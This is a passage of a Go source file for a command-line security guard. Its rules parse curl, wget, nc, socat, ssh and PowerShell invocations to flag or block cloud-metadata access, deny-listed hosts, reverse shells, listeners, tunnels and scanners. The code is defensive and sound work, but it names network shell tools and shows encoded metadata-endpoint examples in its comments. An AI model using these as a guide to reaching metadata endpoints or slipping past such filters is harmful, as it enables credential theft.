package policy

import (
	"net"
	"strings"

	"golang.org/x/net/idna"
	"golang.org/x/text/unicode/norm"

	"github.com/marmutapp/superbased-observer/internal/ipclass"
)

// Network rules R-174 to R-179 (docs/guard.md "Network rules"): what a
// network command on the command line reaches — cloud metadata endpoints,
// hosts on [guard.network] deny_hosts, private and link-local ranges, hosts
// off [guard.network] allow_hosts, listeners and reverse shells, tunnels and
// scanners.
//
// Host classification has ONE owner: internal/ipclass (ParseHostIP + Detail),
// the stdlib-only leaf internal/netpolicy's dial policy also consults, so a
// metadata or private-range verdict can never fork between the guard and the
// dialer. This file owns only how a host NAME is pulled off a command line
// and how [guard.network]'s patterns match it.
//
// DECISION-PAIR NOTE (operator design). R-175 and R-176 are allow/allow:
// their matcher hits, but the verdict decision is allow, so the guard — which
// records and acts only on a decision of flag or stricter — stays silent
// until a recipe or [[override]] raises the row's decision. The deny_hosts
// shape is R-174's own row, NOT R-176's, precisely because an override
// rewrites every row of an ID: were deny_hosts on R-176, raising R-176's
// allow-list row to "ask" would also relax the deny_hosts block from deny to
// ask. Keeping deny_hosts on R-174 (always flag/deny) and the allow-list
// alone on R-176 keeps the two tunable apart.

// networkRules returns the network family's table rows, in catalog order.
func networkRules() []Rule {
	return []Rule{
		{
			// R-174 (a): a cloud instance-metadata endpoint, in any encoding.
			ID: "R-174", Category: CategoryExfil, Severity: SeverityCritical,
			AppliesTo: []EventKind{KindShellExec},
			MatchCmd:  matchNetworkMetadata,
			Observe:   DecisionFlag, Enforce: DecisionDeny,
			Doc:    "network command reaching a cloud instance-metadata endpoint",
			Advice: "The instance metadata service hands out cloud credentials; a tool reaching it is the classic SSRF credential-theft step. Confirm you meant to query it, and never pipe its output off the machine.",
		},
		{
			// R-174 (b): a host on [guard.network] deny_hosts (inert empty).
			ID: "R-174", Category: CategoryExfil, Severity: SeverityCritical,
			AppliesTo: []EventKind{KindShellExec},
			MatchCmd:  matchNetworkDenyHost,
			Observe:   DecisionFlag, Enforce: DecisionDeny,
			Doc:    "network command to a host on the deny list ([guard.network] deny_hosts)",
			Advice: "This host is on your [guard.network] deny_hosts list. Remove the host from the deny list if the request is intended.",
		},
		{
			// R-175 (a): a private / link-local / CGNAT / ULA address.
			ID: "R-175", Category: CategoryExfil, Severity: SeverityWarn,
			AppliesTo: []EventKind{KindShellExec},
			MatchCmd:  matchNetworkPrivateRange,
			Observe:   DecisionAllow, Enforce: DecisionAllow,
			Doc:    "network command to a private, link-local, carrier-NAT or unique-local address",
			Advice: "An agent reaching an internal-network address can be an SSRF probe of your own infrastructure; confirm the target is one you meant to reach.",
		},
		{
			// R-175 (b): a raw public IP instead of a host name.
			ID: "R-175", Category: CategoryExfil, Severity: SeverityWarn,
			AppliesTo: []EventKind{KindShellExec},
			MatchCmd:  matchNetworkRawPublicIP,
			Observe:   DecisionAllow, Enforce: DecisionAllow,
			Doc:    "network command to a raw public IP address instead of a host name",
			Advice: "A literal IP address instead of a host name bypasses name-based allow lists and DNS logging; prefer a host name you can audit.",
		},
		{
			// R-176: a host not on [guard.network] allow_hosts.
			ID: "R-176", Category: CategoryExfil, Severity: SeverityHigh,
			AppliesTo: []EventKind{KindShellExec},
			MatchCmd:  matchNetworkNotAllowed,
			Observe:   DecisionAllow, Enforce: DecisionAllow,
			Doc:    "network command to a host not on the allow list ([guard.network] allow_hosts)",
			Advice: "This host is not on your [guard.network] allow_hosts list. Add it there if the request is intended.",
		},
		{
			// R-177 (a): a reverse shell.
			ID: "R-177", Category: CategoryExfil, Severity: SeverityHigh,
			AppliesTo: []EventKind{KindShellExec},
			Match:     matchReverseShell,
			Observe:   DecisionFlag, Enforce: DecisionDeny,
			Doc:    "reverse shell: an interactive shell wired to a network socket",
			Advice: "This wires a shell to a remote socket - a textbook reverse shell. If you are debugging networking, do it without attaching a shell to the connection.",
		},
		{
			// R-177 (b): a listener.
			ID: "R-177", Category: CategoryExfil, Severity: SeverityHigh,
			AppliesTo: []EventKind{KindShellExec},
			Match:     matchNetworkListener,
			Observe:   DecisionFlag, Enforce: DecisionAsk,
			Doc:    "network listener opened on this machine",
			Advice: "Opening a listening socket exposes this machine to inbound connections; confirm you meant to and that the port is firewalled.",
		},
		{
			// R-178: a tunnel exposing this machine.
			ID: "R-178", Category: CategoryExfil, Severity: SeverityHigh,
			AppliesTo: []EventKind{KindShellExec},
			MatchCmd:  matchNetworkTunnel,
			Observe:   DecisionFlag, Enforce: DecisionAsk,
			Doc:    "tunnel exposing this machine to the public internet",
			Advice: "A public tunnel makes a local service reachable from the internet, bypassing your network boundary; confirm you meant to expose it.",
		},
		{
			// R-179: a network scanner.
			ID: "R-179", Category: CategoryExfil, Severity: SeverityWarn,
			AppliesTo: []EventKind{KindShellExec},
			MatchCmd:  matchNetworkScanner,
			Observe:   DecisionFlag, Enforce: DecisionAsk,
			Doc:    "network/vulnerability scanner",
			Advice: "Scanning hosts or services you do not own is often against policy and can trip intrusion detection; confirm you have authorization for the target.",
		},
	}
}

// --- host extraction ---------------------------------------------------

// networkHost is one host a network command names, with its IP classification
// resolved once at the boundary (CLAUDE.md rule 3: branch on the classified
// fact, not on the command that produced it).
type networkHost struct {
	// name is the cleaned, lowercased host text (the verdict names it).
	name string
	// ip is the resolved address when name is an IP LITERAL (in any
	// encoding), nil when name is a DNS name.
	ip net.IP
	// kind is ipclass.Detail(ip) when ip is non-nil.
	kind ipclass.Kind
	// rawIP reports that the host was written as an IP literal, not a name.
	rawIP bool
}

// metadataHostnames are the DNS names a cloud SDK uses to reach the
// instance-metadata service (the address forms are ipclass.KindMetadata).
var metadataHostnames = map[string]bool{
	"metadata.google.internal":   true,
	"metadata.goog":              true,
	"metadata":                   true,
	"instance-data":              true,
	"instance-data.ec2.internal": true,
}

// httpMethods are the leading method words httpie takes before the URL
// (`http GET example.com`), skipped when finding the host operand.
var httpMethods = map[string]bool{
	"GET": true, "POST": true, "PUT": true, "DELETE": true,
	"PATCH": true, "HEAD": true, "OPTIONS": true,
}

// urlHostBases are the bases whose every argument is scanned for a
// scheme://host URL. It is the union of all R-174..R-176 network commands:
// a URL can appear on any of them (a redirect target, a proxy option).
var urlHostBases = map[string]bool{
	"curl": true, "wget": true, "xh": true, "http": true, "https": true,
	"invoke-webrequest": true, "invoke-restmethod": true, "test-netconnection": true,
	"nc": true, "ncat": true, "netcat": true, "telnet": true,
	"ftp": true, "sftp": true, "scp": true, "rsync": true, "ssh": true,
	"ping": true, "ping6": true, "traceroute": true, "tracepath": true, "mtr": true,
	"socat": true, "openssl": true, "git": true,
	"iwr": true, "irm": true, "tnc": true,
}

// multicallBases are the single-binary toolboxes whose first operand is the
// applet to run (`busybox wget URL`). netEffective makes the applet the base
// for the network rules.
var multicallBases = map[string]bool{"busybox": true, "toybox": true}

// netEffective returns the command the network rules should read: for a
// busybox/toybox multicall invocation, a shallow copy whose base is the
// applet and whose argv starts at it; otherwise cmd itself. The copy shares
// the original's slices (never written).
func netEffective(cmd *Command) *Command {
	if !multicallBases[cmd.Base] || len(cmd.Argv) < 2 {
		return cmd
	}
	applet := cmd.Argv[1]
	if applet == "" || applet[0] == '-' {
		return cmd
	}
	cp := *cmd
	cp.Argv = cmd.Argv[1:]
	if len(cmd.ArgvLiterals) == len(cmd.Argv) {
		cp.ArgvLiterals = cmd.ArgvLiterals[1:]
	}
	cp.Base = canonicalBase(applet, cmd.Dialect)
	return &cp
}

// hostOptSpec is one tool's option grammar for finding host operands: which
// options consume a value (so a value is never read as the host), which of
// those values name a host, and whether every positional operand is a URL.
type hostOptSpec struct {
	// shortValued are the single-dash letters that take a value (getopt
	// style: attached in the same token, or the next token).
	shortValued string
	// longValued are the long options that take a value (`--name VALUE` or
	// `--name=VALUE`).
	longValued map[string]bool
	// hostOpts are the valued options ("-x", "--url") whose value names a
	// host, each with its value parser.
	hostOpts map[string]func(string) []string
	// positionals marks the tool as taking URLs as its positional operands.
	positionals bool
}

// operandHosts reads one URL / host operand value (scheme-less allowed).
func operandHosts(v string) []string {
	if h, ok := plausibleHostOperand(v); ok {
		return []string{h}
	}
	return nil
}

// resolveHosts reads curl --resolve [+]HOST:PORT:ADDR[,ADDR...]: the forced
// addresses are what curl dials.
func resolveHosts(v string) []string {
	v = strings.TrimSpace(v)
	if v == "" || v[0] == '-' {
		return nil // a removal entry names nothing
	}
	f := splitBracketAware(v)
	if len(f) < 3 {
		return nil
	}
	var out []string
	for _, a := range strings.Split(strings.Join(f[2:], ":"), ",") {
		if h, ok := plausibleHostOperand(strings.TrimSpace(a)); ok {
			out = append(out, h)
		}
	}
	return out
}

// connectToHosts reads curl --connect-to HOST1:PORT1:HOST2:PORT2: HOST2 (when
// non-empty) is what curl dials.
func connectToHosts(v string) []string {
	f := splitBracketAware(strings.TrimSpace(v))
	if len(f) < 3 || f[2] == "" {
		return nil
	}
	return operandHosts(f[2])
}

// splitBracketAware splits s on ':' except inside [...] (an IPv6 literal).
func splitBracketAware(s string) []string {
	var out []string
	depth, start := 0, 0
	for i := 0; i < len(s); i++ {
		switch s[i] {
		case '[':
			depth++
		case ']':
			if depth > 0 {
				depth--
			}
		case ':':
			if depth == 0 {
				out = append(out, s[start:i])
				start = i + 1
			}
		}
	}
	return append(out, s[start:])
}

// posixHostSpecs is the per-base table for the getopt-style URL tools (NET-1,
// NET-7). A flag value is skipped by its table row, so it is never read as a
// host; a missed row can only make a value look like an extra host operand,
// which the plausibility check usually rejects.
var posixHostSpecs = map[string]hostOptSpec{
	"curl": {
		shortValued: "AbcCdDeEFHKmoPQrtTuUwxXyYz",
		longValued: setOf("--abstract-unix-socket", "--alt-svc", "--aws-sigv4", "--cacert", "--capath", "--cert", "--cert-type",
			"--ciphers", "--config", "--connect-timeout", "--continue-at", "--cookie", "--cookie-jar", "--create-file-mode",
			"--crlfile", "--curves", "--data", "--data-ascii", "--data-binary", "--data-raw", "--data-urlencode", "--delegation",
			"--dns-interface", "--dns-ipv4-addr", "--dns-ipv6-addr", "--dns-servers", "--dump-header", "--egd-file", "--engine",
			"--expect100-timeout", "--form", "--form-string", "--ftp-account", "--ftp-alternative-to-user", "--ftp-method",
			"--ftp-port", "--ftp-ssl-ccc-mode", "--happy-eyeballs-timeout-ms", "--haproxy-clientip", "--header", "--hostpubmd5",
			"--hostpubsha256", "--hsts", "--interface", "--ipfs-gateway", "--json", "--keepalive-time", "--key", "--key-type",
			"--krb", "--libcurl", "--limit-rate", "--local-port", "--login-options", "--mail-auth", "--mail-from", "--mail-rcpt",
			"--max-filesize", "--max-redirs", "--max-time", "--netrc-file", "--noproxy", "--oauth2-bearer", "--output",
			"--output-dir", "--parallel-max", "--pass", "--pinnedpubkey", "--proto", "--proto-default", "--proto-redir",
			"--proxy-cacert", "--proxy-capath", "--proxy-cert", "--proxy-cert-type", "--proxy-ciphers", "--proxy-crlfile",
			"--proxy-header", "--proxy-key", "--proxy-key-type", "--proxy-pass", "--proxy-pinnedpubkey", "--proxy-service-name",
			"--proxy-tls13-ciphers", "--proxy-tlsauthtype", "--proxy-tlspassword", "--proxy-tlsuser", "--proxy-user", "--pubkey",
			"--quote", "--random-file", "--range", "--rate", "--referer", "--request", "--request-target", "--retry",
			"--retry-delay", "--retry-max-time", "--sasl-authzid", "--service-name", "--speed-limit", "--speed-time", "--stderr",
			"--telnet-option", "--tftp-blksize", "--time-cond", "--tls-max", "--tls13-ciphers", "--tlsauthtype", "--tlspassword",
			"--tlsuser", "--trace", "--trace-ascii", "--trace-config", "--unix-socket", "--upload-file", "--url-query", "--user",
			"--user-agent", "--variable", "--write-out"),
		hostOpts: map[string]func(string) []string{
			"--url": operandHosts, "-x": operandHosts, "--proxy": operandHosts, "--preproxy": operandHosts,
			"--proxy1.0": operandHosts, "--socks4": operandHosts, "--socks4a": operandHosts, "--socks5": operandHosts,
			"--socks5-hostname": operandHosts, "--doh-url": operandHosts,
			"--resolve": resolveHosts, "--connect-to": connectToHosts,
		},
		positionals: true,
	},
	"wget": {
		shortValued: "oaOetTwPUiBQlAIRXD",
		longValued: setOf("--output-file", "--append-output", "--output-document", "--execute", "--tries", "--timeout", "--wait",
			"--waitretry", "--directory-prefix", "--user-agent", "--input-file", "--base", "--quota", "--level", "--accept",
			"--reject", "--domains", "--exclude-domains", "--include-directories", "--exclude-directories", "--header",
			"--post-data", "--post-file", "--user", "--password", "--http-user", "--http-password", "--referer", "--bind-address",
			"--limit-rate", "--dns-timeout", "--connect-timeout", "--read-timeout", "--proxy-user", "--proxy-password",
			"--ca-certificate", "--ca-directory", "--certificate", "--private-key", "--load-cookies", "--save-cookies", "--method",
			"--body-data", "--body-file", "--config", "--report-speed", "--restrict-file-names", "--prefer-family",
			"--secure-protocol", "--ftp-user", "--ftp-password", "--default-page", "--regex-type", "--accept-regex",
			"--reject-regex", "--preferred-location", "--retry-on-http-error", "--bind-dns-address", "--dns-servers",
			"--crl-file", "--random-file", "--egd-file", "--local-encoding", "--remote-encoding", "--progress", "--backups",
			"--warc-file", "--warc-header", "--warc-max-size", "--warc-tempdir", "--pinnedpubkey", "--ciphers"),
		hostOpts:    map[string]func(string) []string{"--base": operandHosts},
		positionals: true,
	},
}

// netPSParam is one PowerShell cmdlet parameter's role.
type netPSParam int

const (
	netPSSwitch netPSParam = iota // takes no value
	netPSValue                    // takes a value that is not a host
	netPSHost                     // takes a value that names a host
)

// netPSSpec is a cmdlet's parameter table (lowercase, no dash) plus the
// parameter its first positional operand binds to.
type netPSSpec struct {
	params     map[string]netPSParam
	aliases    map[string]string // parameter alias -> full name
	positional string            // full name the first positional binds to
}

// netPSWebParams is the shared parameter set of Invoke-WebRequest and
// Invoke-RestMethod.
var netPSWebParams = map[string]netPSParam{
	"uri": netPSHost, "proxy": netPSHost,
	"method": netPSValue, "body": netPSValue, "headers": netPSValue, "contenttype": netPSValue, "outfile": netPSValue,
	"infile": netPSValue, "useragent": netPSValue, "credential": netPSValue, "proxycredential": netPSValue,
	"timeoutsec": netPSValue, "maximumredirection": netPSValue, "maximumretrycount": netPSValue, "retryintervalsec": netPSValue,
	"authentication": netPSValue, "token": netPSValue, "certificate": netPSValue, "certificatethumbprint": netPSValue,
	"sessionvariable": netPSValue, "websession": netPSValue, "transferencoding": netPSValue, "custommethod": netPSValue,
	"form": netPSValue, "httpversion": netPSValue, "sslprotocol": netPSValue, "responseheadersvariable": netPSValue,
	"statuscodevariable": netPSValue, "maximumfollowrellink": netPSValue,
	"usebasicparsing": netPSSwitch, "skipcertificatecheck": netPSSwitch, "skipheadervalidation": netPSSwitch,
	"skiphttperrorcheck": netPSSwitch, "allowunencryptedauthentication": netPSSwitch, "usedefaultcredentials": netPSSwitch,
	"noproxy": netPSSwitch, "passthru": netPSSwitch, "allowinsecureredirect": netPSSwitch, "disablekeepalive": netPSSwitch,
	"resume": netPSSwitch, "preserveauthorizationonredirect": netPSSwitch, "followrellink": netPSSwitch,
	"preservehttpmethodonredirect": netPSSwitch,
}

// netPSSpecs is the per-cmdlet table for NET-1 on the PowerShell tools.
var netPSSpecs = map[string]netPSSpec{
	"invoke-webrequest": {params: netPSWebParams, positional: "uri"},
	"invoke-restmethod": {params: netPSWebParams, positional: "uri"},
	"iwr":               {params: netPSWebParams, positional: "uri"},
	"irm":               {params: netPSWebParams, positional: "uri"},
	"test-netconnection": {
		params: netPSTNCParams, aliases: map[string]string{"cn": "computername", "remotehost": "computername"},
		positional: "computername",
	},
	"tnc": {
		params: netPSTNCParams, aliases: map[string]string{"cn": "computername", "remotehost": "computername"},
		positional: "computername",
	},
}

// netPSTNCParams is Test-NetConnection's parameter set.
var netPSTNCParams = map[string]netPSParam{
	"computername": netPSHost, "port": netPSValue, "commontcpport": netPSValue, "informationlevel": netPSValue,
	"hops": netPSValue, "constraininterface": netPSValue, "constrainsourceaddress": netPSValue,
	"traceroute": netPSSwitch, "diagnoserouting": netPSSwitch,
}

// hosts reads the host operands of a getopt-style argument list.
func (s hostOptSpec) hosts(args []string) []string {
	var out []string
	for i := 0; i < len(args); i++ {
		t := args[i]
		if t == "--" {
			if s.positionals {
				for _, p := range args[i+1:] {
					out = append(out, operandHosts(p)...)
				}
			}
			break
		}
		if len(t) < 2 || t[0] != '-' {
			if s.positionals {
				out = append(out, operandHosts(t)...)
			}
			continue
		}
		if strings.HasPrefix(t, "--") {
			name, val, hasEq := strings.Cut(t, "=")
			if parse, ok := s.hostOpts[name]; ok {
				if !hasEq && i+1 < len(args) {
					val = args[i+1]
					i++
				}
				out = append(out, parse(val)...)
			} else if s.longValued[name] && !hasEq {
				i++
			}
			continue
		}
		for k := 1; k < len(t); k++ {
			if strings.IndexByte(s.shortValued, t[k]) < 0 && s.hostOpts["-"+string(t[k])] == nil {
				continue
			}
			val := t[k+1:]
			if val == "" && i+1 < len(args) {
				val = args[i+1]
				i++
			}
			if parse, ok := s.hostOpts["-"+string(t[k])]; ok {
				out = append(out, parse(val)...)
			}
			break
		}
	}
	return out
}

// hosts reads the host operands of a PowerShell cmdlet's arguments: a
// host-bearing parameter's value, and the first positional operand.
func (s netPSSpec) hosts(args []string) []string {
	resolve := func(name string) (string, netPSParam, bool) {
		name = strings.ToLower(name)
		if full, ok := s.aliases[name]; ok {
			name = full
		}
		if role, ok := s.params[name]; ok {
			return name, role, true
		}
		match, n := "", 0
		for p := range s.params {
			if strings.HasPrefix(p, name) {
				match, n = p, n+1
			}
		}
		if n == 1 {
			return match, s.params[match], true
		}
		return "", netPSSwitch, false
	}
	var out []string
	positionalSeen := false
	for i := 0; i < len(args); i++ {
		t := args[i]
		if len(t) >= 2 && t[0] == '-' {
			name, val, hasColon := strings.Cut(t[1:], ":")
			full, role, ok := resolve(name)
			if !ok || role == netPSSwitch {
				continue
			}
			if !hasColon && i+1 < len(args) {
				val = args[i+1]
				i++
			}
			if role == netPSHost {
				out = append(out, operandHosts(val)...)
				if full == s.positional {
					positionalSeen = true
				}
			}
			continue
		}
		if !positionalSeen {
			positionalSeen = true
			out = append(out, operandHosts(t)...)
		}
	}
	return out
}

// plausibleHostOperand reads a URL / host operand (scheme-less allowed) and
// returns its host only when the text is a plausible host: an IP literal in
// any encoding, or a name of letters, digits, '-', '_' and dots. Header and
// data values (`Accept: x`) are therefore never taken as hosts.
func plausibleHostOperand(t string) (string, bool) {
	var h string
	var ok bool
	if strings.Contains(t, "://") {
		h, ok = urlHost(t)
	} else {
		if j := strings.IndexAny(t, "/?#"); j >= 0 {
			t = t[:j]
		}
		if at := strings.LastIndexByte(t, '@'); at >= 0 {
			t = t[at+1:] // userinfo
		}
		h, ok = hostFromOperand(t)
	}
	if !ok {
		return "", false
	}
	h = cleanHost(normalizeHostText(strings.TrimSpace(h)))
	if h == "" {
		return "", false
	}
	if _, isIP := ipclass.ParseHostIP(h); isIP {
		return h, true
	}
	alnum := false
	for _, r := range h {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
			alnum = true
		case r == '-', r == '_', r == '.', r >= 0x80:
		default:
			return "", false
		}
	}
	return h, alnum && h[0] != '-'
}

// normalizeHostText folds a non-ASCII host spelling (fullwidth digits and
// letters, ideographic dots, IDN labels) to the ASCII form a resolver or
// inet_aton-style parser would dial, so `１６９.２５４.１６９.２５４` classifies
// as the address it is and a deny entry written either way matches. Pure
// ASCII text is returned unchanged.
func normalizeHostText(s string) string {
	for i := 0; i < len(s); i++ {
		if s[i] >= 0x80 {
			if a, err := idna.Lookup.ToASCII(s); err == nil {
				return a
			}
			return strings.ToLower(norm.NFKC.String(s))
		}
	}
	return s
}

// firstPositionalHostBases name the host as their first non-flag operand (a
// port or count follows). Each row is the base's own valued flags, so a
// numeric value before the host is not mistaken for it; nil means no valued
// flag consumes a following token. skipMethods marks httpie.
var firstPositionalHostBases = map[string]struct {
	valued      map[string]bool
	skipMethods bool
}{
	"nc":         {valued: setOf("-p", "-s", "-w", "-q", "-X", "-x", "-b", "-i", "-O", "-T", "-g", "-G", "-m")},
	"ncat":       {valued: setOf("-p", "-s", "-w", "-g", "-G", "-m", "-i", "--source-port", "--source", "--wait", "--proxy", "--proxy-type")},
	"netcat":     {valued: setOf("-p", "-s", "-w", "-q", "-X", "-x", "-b", "-i", "-O", "-T")},
	"telnet":     {valued: setOf("-b", "-e", "-l", "-n", "-N", "-S", "-X")},
	"ping":       {valued: setOf("-c", "-i", "-s", "-t", "-W", "-w", "-I", "-M", "-p", "-Q", "-S", "-l", "-T")},
	"ping6":      {valued: setOf("-c", "-i", "-s", "-t", "-W", "-w", "-I", "-M", "-p", "-Q", "-S", "-l", "-T")},
	"traceroute": {valued: setOf("-f", "-g", "-i", "-m", "-p", "-q", "-s", "-t", "-w", "-z", "-N")},
	"tracepath":  {valued: setOf("-b", "-l", "-m", "-p")},
	"mtr":        {valued: setOf("-c", "-i", "-s", "-p", "-m", "-b", "-Q", "-u")},
	"ftp":        {valued: setOf("-P")},
	"http":       {valued: setOf("-a", "--auth", "-A", "--auth-type", "--proxy", "--verify", "--cert", "--cert-key", "--timeout", "--style", "-o", "--output", "--session", "--session-read-only", "-p", "--print", "--pretty", "--max-redirects"), skipMethods: true},
	"https":      {valued: setOf("-a", "--auth", "-A", "--auth-type", "--proxy", "--verify", "--cert", "--cert-key", "--timeout", "--style", "-o", "--output", "--session", "--session-read-only", "-p", "--print", "--pretty", "--max-redirects"), skipMethods: true},
	"xh":         {valued: setOf("-a", "--auth", "-A", "--auth-type", "--proxy", "--verify", "--cert", "--cert-key", "--timeout", "--style", "-o", "--output", "--session", "--session-read-only", "-p", "--print", "--pretty", "--max-redirects"), skipMethods: true},
}

// socatConnectProtos are the socat address types that OPEN an outbound
// connection, so their host field (`TCP:host:port`) is a target. LISTEN
// forms are not here — those are R-177's listener shape.
var socatConnectProtos = map[string]bool{
	"tcp": true, "tcp4": true, "tcp6": true,
	"udp": true, "udp4": true, "udp6": true,
	"sctp": true, "sctp4": true, "sctp6": true,
	"openssl": true, "openssl-connect": true,
	"socks4": true, "socks4a": true, "socks5": true, "proxy": true,
}

// collectNetworkHosts returns every host a network command names, classified
// once. It returns nil for a command that is not a network command for the
// R-174..R-176 rows, which leaves those rows inert on it.
func collectNetworkHosts(cmd *Command) []networkHost {
	cmd = netEffective(cmd)
	base := cmd.Base
	if !urlHostBases[base] {
		return nil
	}
	var hosts []networkHost
	seen := map[string]bool{}
	add := func(raw string) {
		h, ok := classifyNetworkHost(raw)
		if !ok || seen[h.name] {
			return
		}
		seen[h.name] = true
		hosts = append(hosts, h)
	}

	// A scheme://host URL can appear on any network command.
	for _, t := range cmd.Args() {
		if h, ok := urlHost(t); ok {
			add(h)
		}
	}

	// Scheme-less URL operands and the options that name or force a host
	// (NET-1, NET-7), read through the per-base option tables.
	if spec, ok := posixHostSpecs[base]; ok {
		for _, h := range spec.hosts(cmd.Args()) {
			add(h)
		}
	}
	if spec, ok := netPSSpecs[base]; ok {
		for _, h := range spec.hosts(cmd.Args()) {
			add(h)
		}
	}

	for _, h := range baseNamedHosts(cmd, base) {
		add(h)
	}
	return hosts
}

// baseNamedHosts is the raw host text the command's own syntax names for the
// bases that place a host somewhere other than a URL or an option table: an
// openssl s_client -connect, a git remote URL, an ssh destination, a remote
// spec of scp/sftp/rsync, a socat connect address, or the first host operand
// of the first-positional bases (a listener names none; R-177 owns it).
func baseNamedHosts(cmd *Command, base string) []string {
	var out []string
	remoteSpecs := func() {
		for _, t := range cmd.Args() {
			if h, ok := remoteSpecHost(t); ok {
				out = append(out, h)
			}
		}
	}
	switch {
	case base == "openssl":
		// Only `s_client -connect host:port` names a host.
		if hasPositionalWord(cmd, "s_client") {
			if v, ok := cmd.FlagValue("-connect"); ok {
				if h, ok := hostPortHost(v); ok {
					out = append(out, h)
				}
			}
		}
	case base == "git":
		if gitNamesRemoteURL(cmd) {
			remoteSpecs()
		}
	case base == "ssh":
		if h, ok := sshDestinationHost(cmd); ok {
			out = append(out, h)
		}
	case base == "scp" || base == "sftp" || base == "rsync":
		remoteSpecs()
	case base == "socat":
		for _, t := range cmd.Args() {
			out = append(out, socatConnectHosts(t)...)
		}
	default:
		if spec, ok := firstPositionalHostBases[base]; ok && !ncListener(cmd) {
			if h, ok := firstHostOperand(cmd, spec.valued, spec.skipMethods); ok {
				out = append(out, h)
			}
		}
	}
	return out
}

// classifyNetworkHost cleans a host token and resolves its IP classification
// once. A token that is neither an IP literal nor a plausible host name
// yields ok=false.
func classifyNetworkHost(raw string) (networkHost, bool) {
	h := cleanHost(normalizeHostText(strings.TrimSpace(raw)))
	if h == "" {
		return networkHost{}, false
	}
	if ip, ok := ipclass.ParseHostIP(h); ok {
		return networkHost{name: strings.ToLower(h), ip: ip, kind: ipclass.Detail(ip), rawIP: true}, true
	}
	return networkHost{name: strings.ToLower(h)}, true
}

// cleanHost strips a trailing FQDN dot and surrounding IPv6 brackets.
func cleanHost(raw string) string {
	h := strings.TrimSpace(raw)
	if len(h) >= 2 && h[0] == '[' && h[len(h)-1] == ']' {
		h = h[1 : len(h)-1]
	}
	h = strings.TrimSuffix(h, ".")
	return h
}

// urlHost extracts the host from a scheme://host[:port]/path token, stripping
// userinfo, brackets and a trailing :port.
func urlHost(token string) (string, bool) {
	i := strings.Index(token, "://")
	if i < 0 {
		return "", false
	}
	rest := token[i+3:]
	if j := strings.IndexAny(rest, "/?#"); j >= 0 {
		rest = rest[:j]
	}
	if at := strings.LastIndexByte(rest, '@'); at >= 0 {
		rest = rest[at+1:] // strip userinfo
	}
	if strings.HasPrefix(rest, "[") { // [ipv6]:port
		if k := strings.IndexByte(rest, ']'); k >= 0 {
			return rest[1:k], true
		}
	}
	if k := strings.LastIndexByte(rest, ':'); k >= 0 && isAllDigits(rest[k+1:]) {
		rest = rest[:k] // strip :port
	}
	return rest, rest != ""
}

// remoteSpecHost extracts the host of an scp/rsync/git remote operand
// (user@host:path or host:path). A single-letter prefix before ':' is a
// Windows drive path, never a host.
func remoteSpecHost(p string) (string, bool) {
	if strings.Contains(p, "://") {
		return "", false // a URL, handled by urlHost
	}
	i := strings.IndexByte(p, ':')
	if i <= 1 {
		return "", false
	}
	host := p[:i]
	if strings.ContainsAny(host, "/\\") {
		return "", false // a path with a stray colon
	}
	if at := strings.LastIndexByte(host, '@'); at >= 0 {
		host = host[at+1:]
	}
	return host, host != ""
}

// sshDestinationHost finds ssh's destination operand (past its options) and
// returns its host, stripping a user@ prefix.
func sshDestinationHost(cmd *Command) (string, bool) {
	i := skipSSHFlags(cmd.Argv, 1)
	if i >= len(cmd.Argv) {
		return "", false
	}
	dest := cmd.Argv[i]
	if strings.Contains(dest, "://") {
		return urlHost(dest) // ssh://host/...
	}
	if at := strings.LastIndexByte(dest, '@'); at >= 0 {
		dest = dest[at+1:]
	}
	return dest, dest != ""
}

// socatProxyProtos are the socat address types whose operand is
// `<proxy>:<target-host>:<target-port>`: both hosts are dialed or named.
var socatProxyProtos = map[string]bool{"socks4": true, "socks4a": true, "socks5": true, "proxy": true}

// socatConnectHosts extracts the hosts of a socat connecting address
// (`TCP:host:port`, `TCP6:[v6]:port`, `OPENSSL:host:port,opts`,
// `SOCKS4:proxy:target:port`); LISTEN forms return nil.
func socatConnectHosts(token string) []string {
	i := strings.IndexByte(token, ':')
	if i < 0 {
		return nil
	}
	proto := strings.ToLower(token[:i])
	if !socatConnectProtos[proto] {
		return nil
	}
	rest := token[i+1:]
	if j := strings.IndexByte(rest, ','); j >= 0 {
		rest = rest[:j] // address options
	}
	if socatProxyProtos[proto] {
		var out []string
		f := splitBracketAware(rest)
		for k := 0; k < len(f) && k < 2 && k < len(f)-1; k++ {
			if f[k] != "" {
				out = append(out, f[k])
			}
		}
		return out
	}
	if h, ok := hostPortHost(rest); ok {
		return []string{h}
	}
	return nil
}

// hostPortHost extracts the host from a host:port operand (openssl -connect,
// a socat address), handling a bracketed IPv6 literal and a bare unbracketed
// IPv6 address.
func hostPortHost(v string) (string, bool) {
	v = strings.TrimSpace(v)
	if _, ok := ipclass.ParseHostIP(v); ok && strings.Contains(v, ":") {
		return v, true
	}
	if strings.HasPrefix(v, "[") {
		if k := strings.IndexByte(v, ']'); k >= 0 {
			return v[1:k], true
		}
	}
	if k := strings.LastIndexByte(v, ':'); k >= 0 {
		v = v[:k]
	}
	return v, v != ""
}

// firstHostOperand returns the first non-flag operand of cmd as its host,
// skipping valued flags (and leading httpie method words), and stripping any
// path and :port from the operand. ok=false when the command names no
// operand (flags only).
func firstHostOperand(cmd *Command, valued map[string]bool, skipMethods bool) (string, bool) {
	args := cmd.Args()
	for i := 0; i < len(args); i++ {
		t := args[i]
		if t == "" {
			continue
		}
		if t == "--" {
			if i+1 < len(args) {
				return hostFromOperand(args[i+1])
			}
			return "", false
		}
		if t[0] == '-' {
			name := t
			if j := strings.IndexByte(t, '='); j >= 0 {
				continue // inline value, e.g. --timeout=5
			}
			if valued[strings.ToLower(name)] {
				i++ // its value is the next token
			}
			continue
		}
		if skipMethods && httpMethods[strings.ToUpper(t)] {
			continue
		}
		return hostFromOperand(t)
	}
	return "", false
}

// hostFromOperand reduces a bare host operand to its host: a URL yields its
// authority, otherwise the path and a :port are stripped.
func hostFromOperand(t string) (string, bool) {
	if strings.Contains(t, "://") {
		return urlHost(t)
	}
	if j := strings.IndexAny(t, "/?#"); j >= 0 {
		t = t[:j]
	}
	if strings.HasPrefix(t, "[") { // [ipv6]:port
		if k := strings.IndexByte(t, ']'); k >= 0 {
			return t[1:k], true
		}
	}
	// A whole unbracketed IPv6 literal (`nc fd00:ec2::254 80`) is the host;
	// try it before any :port stripping eats its last hextet (NET-2).
	if _, ok := ipclass.ParseHostIP(t); ok && strings.Contains(t, ":") {
		return t, true
	}
	if k := strings.LastIndexByte(t, ':'); k >= 0 && isAllDigits(t[k+1:]) {
